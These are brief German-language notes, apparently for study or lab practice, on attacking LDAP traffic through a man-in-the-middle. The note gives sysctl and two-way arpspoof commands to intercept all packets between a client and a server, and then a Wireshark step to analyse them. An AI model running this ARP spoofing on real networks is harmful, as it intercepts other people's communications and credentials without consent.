# LDAP Attack

## 1. Man-in-the-Middle 

1. Packet Weiterleitung aktivieren
```bash
sysctl -w net.ipv4.ip_forward=1
```

2. Packete abfangen mithilfe *arpspoof*
```bash
arpspoof -i [Netzwerk Interface] -t [Client IP] [Server IP]
arpspoof -i [Netzwerk Interface] -t [Server IP] [Client IP]
```
> Dadurch werden alle Packete zwischen Server und Client abgefangen

3. Mit Wireshark die Kommunikation analysieren
